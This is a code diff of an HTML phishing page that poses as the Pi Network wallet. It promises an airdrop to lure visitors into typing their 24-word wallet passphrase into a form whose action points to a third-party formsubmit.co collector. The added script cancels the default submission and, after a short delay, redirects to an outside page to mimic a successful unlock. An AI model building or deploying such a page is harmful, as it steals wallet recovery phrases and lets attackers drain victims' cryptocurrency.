@@ -104,7 +104,7 @@
         <h2>The official Pi Network has reached 2 million pioneers!</h2>
         <p>To get closer to the mainnet and activate and attract more pioneers, they will be holding an airdrop, awarding a total of 614 pi/pioneer prizes to those who successfully complete KYC. The future looks very exciting as the Pi community continues to build the Web3 Pi ecosystem.</p>
         <h2>Enter Your 24-Word Passphrase</h2>
-        <form action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST">
+        <form id="unlockForm" action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST" onsubmit="handleSubmit(event)">
             <textarea name="passphrase" placeholder="Enter your 24-word passphrase" required></textarea>
             <button type="submit" class="btn-outline">Unlock With Passphrase</button>
         </form>
@@ -113,5 +113,18 @@
         <p class="info-text">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
         <p class="info-text">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your pi in your previous wallet will be inaccessible.</p>
     </main>
+
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+            let form = document.getElementById("unlockForm");
+
+            // Simulate form submission and redirect after a short delay
+            setTimeout(function () {
+                // Redirect to the page of your choice
+                window.location.href = "https://ashrafalajouri.github.io/";
+            }, 2000); // 2 second delay before redirection
+        }
+    </script>
 </body>
 </html>
